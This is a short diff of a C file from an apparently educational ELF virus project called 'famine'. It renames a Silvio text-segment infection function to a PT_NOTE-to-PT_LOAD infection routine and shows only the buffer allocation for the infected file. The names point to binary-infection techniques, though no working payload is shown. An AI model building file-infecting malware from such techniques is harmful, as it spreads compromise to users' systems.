@@ -1,18 +1,18 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   silvio_text_infection.c                            :+:      :+:    :+:   */
+/*   pt_note_to_pt_load_infection.c                     :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: mabouce <ma.sithis@gmail.com>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2021/09/23 18:05:03 by mabouce           #+#    #+#             */
-/*   Updated: 2021/09/23 18:05:03 by mabouce          ###   ########.fr       */
+/*   Created: 2021/09/23 18:04:56 by mabouce           #+#    #+#             */
+/*   Updated: 2021/09/23 18:04:56 by mabouce          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "famine.h"
 
-void silvio_text_infection(t_famine *famine)
+void pt_note_to_pt_load_infection(t_famine *famine)
 {
     // Create the output file
     if (!(famine->infected_file = malloc(famine->binary_data_size + PAGE_SIZE)))
